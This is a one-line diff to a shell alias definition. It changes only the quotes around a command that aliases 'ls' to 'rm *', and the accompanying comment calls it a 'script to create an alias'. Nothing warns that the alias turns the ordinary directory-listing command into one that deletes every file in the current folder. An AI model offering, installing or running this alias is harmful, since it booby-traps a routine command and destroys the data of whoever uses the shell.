@@ -1,1 +1,1 @@
-alias ls "rm *"  script to create an alias
+alias ls 'rm *'  script to create an alias
